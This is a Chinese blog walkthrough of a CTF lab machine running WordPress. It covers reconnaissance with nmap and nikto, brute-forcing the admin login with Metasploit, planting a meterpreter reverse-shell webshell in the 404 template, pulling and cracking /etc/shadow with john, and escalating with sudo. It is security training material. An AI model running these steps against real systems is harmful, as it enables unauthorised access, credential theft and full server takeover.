<!--yml
category: 未分类
date: 2022-04-26 14:30:35
-->

# ctf训练 web安全暴力破解_爱吃香菜的哈哈的博客-CSDN博客

> 来源：[https://blog.csdn.net/qq_43799246/article/details/110562957](https://blog.csdn.net/qq_43799246/article/details/110562957)

## ctf训练 web安全暴力破解

**暴力破解漏洞介绍**

穷举法的基本思想是根据题目的部分条件确定答案的大致范围，并在此范围内对所有可能的情况逐一验证，直到全部情况验证完毕。若某个情况验证符合题目的全部条件，则为本问题的一个解;若全部情况验证后都不符合题目的全部条件，则本题无解。穷举法也称为枚举法。

Web安全中的暴力破解也是利用尝试所有的可能性最终获取正确的结果。

**实验环境**

一台kail攻击机 和 靶机
靶机镜像：[https://pan.baidu.com/s/1jitlWbjJHfyzfvPEBVDhUw](https://pan.baidu.com/s/1jitlWbjJHfyzfvPEBVDhUw)
提取码：x8cc

安装打开靶机（使用Oracle VM VirtualBox打开）：
（注意：靶机用桥接模式则攻击机也用桥接模式，注意检查！！！！）

接下来发现没法登陆，也没有办法获取ip地址
所以我们在kail下
进入控制台

使用netdiscover命令 netdiscover -r ip/子网掩码 命令来探测靶机，靶机ip为192.168.43.46
![在这里插入图片描述](img/1480610dea4cfd3781d2fd59bf549eef.png)本机ip为192.168.43.96
![在这里插入图片描述](img/44a3dcfa577e9ef8401d4462f3551aaf.png)

**信息探测**

扫描主机服务信息以及服务版本
– nmap -sV靶场IP地址
![在这里插入图片描述](img/ea47bcc506d771fd4e0b170e5caffe8d.png)

快速扫描主机全部信息
– nmap -T4 -A -v靶场IP地址

![在这里插入图片描述](img/2f7499906c0f5b2290385785ae2c6ddc.png)

探测敏感信息
– nikto -host http://靶场lP地址:端口
![在这里插入图片描述](img/21b6f5c1435907ea6e20fc2b52762e5c.png)
**深入挖掘**

分析nmap .nikto扫描结果，并对结果进行分析，挖掘可以利用的信息;

在这里发现可疑目录`/secret/`
![在这里插入图片描述](img/8d503c11dbad7be8cc46ab5d5084a295.png)

使用浏览器打开http:/ /ip:port/敏感页面，查看敏感信息，找到可利用的位置;

这里http默认端口号为80，所以端口号可以省略不加
![在这里插入图片描述](img/c2a13fea247d46cea3afc3dbbc1b4e27.png)发现一个login，于是点击
![在这里插入图片描述](img/e745459acd3032c971c22909ce389e4a.png)发现了一个登录界面，所以我们就想着找用户名和密码
![在这里插入图片描述](img/2e8f6f75dc750d92a3882f4505d4a42f.png)
**暴力破解**

首先使用wpscan对用户名进行枚举
![在这里插入图片描述](img/115bbd3d976f97f2965d0271cac34f82.png)![在这里插入图片描述](img/b9c7690e432af8de898d12f661fa81e2.png)
![在这里插入图片描述](img/c5004254485fdfa7968c07f48bb956fe.png)
使用上面得到的信息，查看用户名
![在这里插入图片描述](img/cb2435bd0d78028db65e5c34e92f83ff.png)
得到用户名为admin

接下来启动Metasploit -> msfconsole

选择模块
msf > use auxiliary/scanner/http/wordpress_login_enum
![在这里插入图片描述](img/f47e27f3c8530edfd1029e440aebed2f.png)show options 查看参数
![在这里插入图片描述](img/d94b65ed044ad3fb5de9069b7fca7b01.png)
设置我们已知的用户名

msf auxiliary(wordpress_login_enum) > set username admin
![在这里插入图片描述](img/f2f24ef2a190817c5ddfed3fa879b267.png)

设置密码文件

msf auxiliary(wordpress_login_enum) > set pass_file /usr/share/wordlists/dirb/common.txt
![在这里插入图片描述](img/54f0db30d411bfde8848dc7b4b7d60cd.png)

设置目标url
msf auxiliary(wordpress_login_enum) > set targeturi secret/
![在这里插入图片描述](img/f86f949176f0f62dc48a826fc58fb94e.png)设置目标ip

msf auxiliary(wordpress_login_enum) > set rhosts 靶机ip
![在这里插入图片描述](img/18327f8d8841792740d137c022721112.png)
运行，开始破解

msf auxiliary(wordpress_login_enum) > run
![在这里插入图片描述](img/c50e2d9da5571184f356597f62eb842b.png)
破解成功，得到密码也是admin

使用破解好的密码登录系统

![在这里插入图片描述](img/0a4872b7b865b9f1e8538d58b6e33597.png)进入后台
![在这里插入图片描述](img/3e3bb02d58ff38b2592e23607f92f74c.png)
**上传webshell获取控制权**

制作webshell
使用msfvenom制作shell代码，将代码复制下来
![在这里插入图片描述](img/dac7456842cc95cacb63ea664e014ba1.png)

wordpress后台寻找上传点
appearance的editor，然后再点击右侧的404 Template，将代码替换为shell代码

![在这里插入图片描述](img/b9f6c2952ee4b0336dcebc683a7e3b63.png)

```
退出当前模块
back

使用监听模块
use exploit/multi/handler

设置为php模式
set payload php/meterpreter/reverse_tcp

查看参数
show options

设置kali的ip
set LHOST 本机ip

开始监听
run 
```

执行shell，获取反弹shell。

http: //靶场IP/secret/wp-content /themes/twentysevernteen /404.php
![在这里插入图片描述](img/ed09a24c4442c9e4e545882ce7de712f.png)![在这里插入图片描述](img/0f21e89e234e0a857176c026a17fb6df.png)

查看系统信息 sysinfo

查看用户权限id

![在这里插入图片描述](img/4d528ea0a7f43ae8dde79b93b25dbe32.png)
**root权限**

– Metasploit中利用返回shell 下载
download /etc/passwd
download /etc/shaclow
![在这里插入图片描述](img/a943e0837a8e66368f6c84683a81e948.png)

–将文件转换为join可以识别的文件格式

unshadow passwd shadow > cracked

– 使用john破解密码
john cracked
得到用户名marlinspike和密码marlinspike
![在这里插入图片描述](img/abcdf4224ba34af5e3a09c96cd898239.png)优化终端
python -c “import pty;pty.spawn(’/bin/bash’)”
![在这里插入图片描述](img/bcc61000ce233ea72482348fe5a0f9ce.png)![在这里插入图片描述](img/a99d102add7b540898390028e488d362.png)

```
切换到marlinspike用户
su - marlinspike

查看权限
sudo -l

提权
sudo bash 
```

![在这里插入图片描述](img/48f265923b2000baafa67c67487577c6.png)
**获取Flag**

一般情况下，靶场机器的flag值是存放在服务器的根目录下，/root/目录。

cd /root/
ls
cat flag

![在这里插入图片描述](img/4b2c985451db6b74db134a243f997815.png)
这个靶机下没有flag值，结束！！！

**`总结`**

提权时可以抓取/etc/passwd和/etc/shadow，之后使用join来破解对应的密码，然后使用对应的用户名密码提升root权限;

对于wp的渗透中，启动对应的主题，然后在404页面上传shell ;